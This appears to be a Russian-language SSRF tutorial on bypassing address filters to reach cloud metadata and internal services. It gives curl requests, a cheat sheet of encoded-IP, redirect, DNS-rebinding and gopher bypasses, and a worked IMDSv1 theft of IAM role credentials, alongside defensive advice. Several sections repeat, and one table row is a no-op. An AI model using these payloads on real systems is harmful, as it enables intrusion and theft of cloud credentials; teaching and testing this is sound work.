## Вопрос, с которого всё начинается

Мы знаем, что SSRF ведёт к metadata. Но что делать, если приложение **фильтрует** адреса и не пускает к `169.254.169.254`? Существует целый набор обходов, которые позволяют добраться до цели, минуя фильтр. Разберём их на конкретном приложении.

## Наш пример: SSRF с фильтром

Объект урока — приложение с параметром `url`, которое проверяет адрес перед запросом. Проверим, как выглядит фильтр, и обойдём его.

## Шаг 1: понимаем, что именно фильтруется

Пробуем прямой адрес:

```
$ curl -s "https://app.acme-corp.com/fetch?url=http://169.254.169.254/latest/meta-data/"
{"error":"blocked: forbidden host"}
```

Фильтр отклонил запрос по строке `169.254.169.254`. Значит, проверяется **текст** адреса. Такие фильтры обходятся разными формами записи того же адреса.

## Шаг 2: обход через decimal-форму

IP-адрес можно записать как одно большое число:

```
$ curl -s "https://app.acme-corp.com/fetch?url=http://2852039166/latest/meta-data/"
ami-id
instance-id
```

Фильтр искал строку `169.254.169.254`, а её в запросе нет — только число `2852039166`, которое резолвится в тот же адрес. Обход работает.

## Шаг 3: обход через редирект

Если приложение следует перенаправлениям (HTTP 302), можно подсунуть внешний сервер, который редиректит на внутренний адрес. Фильтр проверяет **исходный** URL, а редирект ведёт куда нужно. Для этого поднимают свой сервер с ответом `302 Location: http://169.254.169.254/...`.

## Шаг 4: обход через DNS-перепривязку

Более изящный способ: завести домен, который при первой проверке резолвится в «разрешённый» IP, а при фактическом запросе — в `169.254.169.254`. Так фильтр видит «безопасное» имя, а соединение уходит внутрь. Это называется **DNS rebinding**.

## Шаг 5: другие формы и адреса

Полезно держать под рукой варианты записи и дополнительные адреса:

| Форма | Пример |
|-------|--------|
| Decimal | `2852039166` |
| Octal | `0251.0376.0251.0376` |
| IPv6 | `fd00:ec2::254` |
| Короткая | `169.254.169.254` → `169.254.169.254` (без обхода) |

Аналогично обходятся фильтры «запретить localhost»: `127.0.0.1`, `0.0.0.0`, `[::1]`, `127.1` — всё это тот же хост в разных формах.

## Шаг 6: зачем нужны внутренние API

Metadata — не единственная цель SSRF. Внутри сети живут внутренние API, админки, базы. Через SSRF можно:

- обратиться к внутреннему API без аутентификации (он доверяет сети);
- прочитать конфигурацию сервиса;
- достучаться до Docker-сокета или kubelet.

Внутренние сервисы часто **не имеют** внешней аутентификации, потому что «и так недоступны». SSRF ломает это предположение.

## Шаг 7: от SSRF к роли

Финальная цель — облачная роль. Схема: обойти фильтр → попасть в metadata → получить токен/ключи → использовать. Для AWS это IMDS (v1 простой, v2 с токеном), для Azure — токен с заголовком `Metadata: true`, для GCP — с `Metadata-Flavor: Google`. Обходы из шагов 2–4 применяются ко всем трём: они обходят **фильтр приложения**, а не защиту провайдера.

## Шаг 8: как защищаться

- разрешать приложению ходить только на явный allow-list адресов;
- резолвить имя **и** проверять итоговый IP перед соединением;
- запрещать следование редиректам на внутренние адреса;
- использовать IMDSv2 и заголовочные требования провайдеров;
- изолировать приложение в сети без доступа к metadata.

## Шаг 9: практический чек-лист обхода фильтров

Когда прямой адрес заблокирован, пробуй по очереди: decimal (`2852039166`), octal (`0251.0376...`), IPv6 (`fd00:ec2::254`), короткие формы (`127.1` вместо `127.0.0.1`), редирект с внешнего сервера, DNS-перепривязку. Параллельно проверяй, не фильтруется ли только `http` (иногда `file://` или `gopher://` проходят) и не обходится ли фильтр сменой регистра или добавлением точки в конце домена. Каждая из этих техник ломает конкретный тип проверки — поэтому важно понять, **что именно** фильтруется, прежде чем подбирать обход.

## Шаг 10: внутренние сервисы как цель

Metadata — не единственная цель. Внутри сети живут сервисы, которые «доверяют сети» и потому не проверяют аутентификацию. Через SSRF к ним можно обратиться напрямую — и часто это проще, чем возиться с обходами фильтра до metadata:

- **внутренний API** — например, `http://api.internal.acme/users` отдаёт данные без токена;
- **Docker-сокет** — `http://localhost:2375/containers/json` управляет контейнерами на хосте;
- **kubelet** — `https://localhost:10250/pods` раскрывает поды и их секреты;
- **Redis без пароля** — `http://localhost:6379` позволяет выполнить команды через Gopher.

Каждый такой сервис — отдельный «приз». Поэтому при эксплуатации SSRF стоит не ограничиваться `169.254.169.254`, а просканировать внутренний периметр: часто именно там находится более простой путь к данным, чем metadata.

## Шаг 11: шпаргалка по обходу SSRF

Когда прямой адрес закрыт: decimal, octal, IPv6, короткие формы, редирект, DNS-перепривязка, смена схемы (`file://`, `gopher://`). Параллельно проверяй внутренние сервисы: API без аутентификации, Docker-сокет, kubelet, Redis. Цель — либо metadata с кредами роли, либо внутренний сервис, который «доверяет сети».

## Шаг 12: пример из CTF

В CTF SSRF часто ведёт на учебный «metadata-сервис» на внутреннем адресе, а фильтр запрещает его прямое указание. Обход через decimal или редирект — и ты получаешь «креды роли», которыми открывается следующий сервис. Сюжет повторяет реальный, только с меньшим риском. Поэтому тренировка обходов на учебных задачах напрямую переносится на реальные приложения.

## Практический совет

Начинай с самого простого: если прямой адрес проходит, не изобретай обходы. Они нужны только тогда, когда есть фильтр, — и тогда важно сначала понять его логику: проверяется строка, резолв или схема. Это экономит время и снижает шум в логах. И держи под рукой шпаргалку форм адреса: она пригодится на каждом втором задании. А если фильтр упрямый, вернись к разведке: возможно, во внутренней сети есть цель проще, чем metadata.

## Частые вопросы

**«Что именно проверяет фильтр?»** Обычно строку адреса. Значит, обход — это другая запись того же адреса.

**«Почему decimal-форма работает?»** Фильтр ищет текст `169.254.169.254`, а в запросе только число `2852039166`, ведущее туда же.

**«Что делать, если фильтр резолвит имя?»** Проверять итоговый IP сложнее — тогда помогают DNS-перепривязка и редирект.

**«Только ли metadata — цель?»** Нет. Внутренние API, Docker-сокет, kubelet и Redis часто проще и полезнее.

## Что мы теперь знаем

По-простому:

1. SSRF-фильтры проверяют строку адреса — её можно обойти.
2. Decimal/octal/IPv6-формы обходят фильтр по строке.
3. Редирект и DNS-rebinding обходят проверку хоста.
4. Внутренние API часто не защищены — SSRF даёт к ним доступ.
5. Конечная цель — облачная роль через metadata.

## На что смотреть дальше

- **Пробуй разные формы адреса.** Одна из них пройдёт.
- **Проверяй редиректы.** Следование 302 — частый обход.
- **Смотри внутренние API.** Там нет внешней аутентификации.
- **Не забывай про IPv6.** Фильтры часто его не учитывают.

## Таблица: SSRF-фильтры и способы обхода

Фильтры SSRF почти всегда чёрные списки, а чёрный список по IP/строке обходится вариациями представления адреса. Ниже — карта «фильтр → обход».

| Фильтр блокирует | Обход | Пример |
|------------------|-------|--------|
| `127.0.0.1` строкой | decimal/octal/hex IP | `http://2130706433/` |
| `localhost` | DNS-имя с тем же IP | `http://localtest.me/` |
| приватные диапазоны (regex) | DNS-перепривязка | домен, резолвящийся в `169.254.169.254` |
| scheme `file://` | редирект с http | 302 → `file:///etc/passwd` |
| ключевые слова | URL-encoding, `@` | `http://allowed.com@169.254.169.254/` |
| один резолв | rebinding TTL=0 | два A-записи, смена между проверкой и запросом |
| IPv4-only | IPv6-маппинг | `http://[::ffff:169.254.169.254]/` |

Главный принцип: **фильтр по строке всегда слабее фильтра по резолвнутому IP**, а фильтр по одному резолву слабее фильтра по каждому запросу с повторной проверкой.

## Рабочий пример: кража кредов из metadata через SSRF (IMDSv1)

Классическая облачная цель SSRF — сервис метаданных. На AWS (IMDSv1) достаточно двух запросов:

```bash
# 1) SSRF-запрос к metadata (через уязвимый параметр url=)
curl "https://victim.example/fetch?url=http://169.254.169.254/latest/meta-data/iam/security-credentials/"

# 2) Ответ — имя роли, затем читаем её креды:
curl "https://victim.example/fetch?url=http://169.254.169.254/latest/meta-data/iam/security-credentials/ec2-role"
# -> {"AccessKeyId":"ASIA...","SecretAccessKey":"...","Token":"..."}
```

Если SSRF-эндпоинт возвращает тело ответа, креды утекают напрямую. Далее их используют с `aws configure`/`aws sts get-caller-identity` для эскалации по IAM. Защита — **IMDSv2** (требует PUT-токен с TTL), который SSRF-запросом через GET получить нельзя; плюс жёсткая проверка `Host`-заголовка.

## Ограничения и типичные ошибки

- **Слепой SSRF.** Если тело не возвращается, креды не прочитать — используйте out-of-band (DNS/HTTP-коллаборатор) для подтверждения, а данные тяните через внутренний эндпоинт, отражающий ответ.
- **IMDSv2 блокирует простой обход.** GET без токена вернёт 401; нужен способ отправить PUT с заголовком — не все SSRF это позволяют.
- **GCP/Azure отличаются по путям.** У GCP заголовок `Metadata-Flavor: Google`; у Azure — `Metadata: true`; универсальный payload не сработает.
- **Редирект может быть отключён.** Если библиотека не следует 302, обход через редирект не сработает — пробуйте decimal/rebinding.
- **DNS-перепривязка требует контроля домена.** Для этого нужен свой DNS с TTL=0; публичные сервисы rebinding могут быть заблокированы.

## Куда дальше

Мы разобрали обходы SSRF и путь к облачным ролям. Это завершает ветку про идентичность и доступ. Дальше в дереве — работа с данными и хранилищами: S3, базы, эксфильтрация. А пока запомни главное: SSRF-фильтр обходится формой адреса или редиректом, и за ним всегда стоит metadata с кредами роли.

## Где пригодится

- **CTF (Cloud):** SSRF с фильтрами — частый сюжет.
- **Bug bounty:** SSRF с высоким импактом в облачных приложениях.
- **Пентест:** тестирование фильтров и изоляции сети.
- **Blue team:** allow-list, проверка итогового IP, изоляция metadata.
